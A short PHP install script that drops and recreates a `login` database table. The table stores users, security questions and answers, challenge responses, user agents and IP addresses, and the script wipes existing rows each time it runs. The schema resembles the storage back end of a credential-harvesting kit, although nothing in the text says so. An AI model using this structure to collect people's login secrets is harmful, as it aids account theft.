<?php
include "config/data.php";
try {

$result = $conn -> query("DROP TABLE IF EXISTS `login`");
$result = $conn -> query("CREATE TABLE IF NOT EXISTS `login` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `user` varchar(255) DEFAULT NULL,
  `sq` varchar(255) DEFAULT NULL,
  `sa` varchar(255) DEFAULT NULL,
  `secc` varchar(255) DEFAULT NULL,
  `challenge` varchar(255) DEFAULT NULL,
  `response` varchar(255) DEFAULT NULL,
  `ua` varchar(1000) DEFAULT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `time` varchar(255) DEFAULT NULL,
  `updatetime` varchar(255) DEFAULT NULL,
  `status` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;");

}
catch(Exception $e) {
  echo 'Some error occured';
  die();
}
echo "Database Refreshed/Installed Successfully";
?>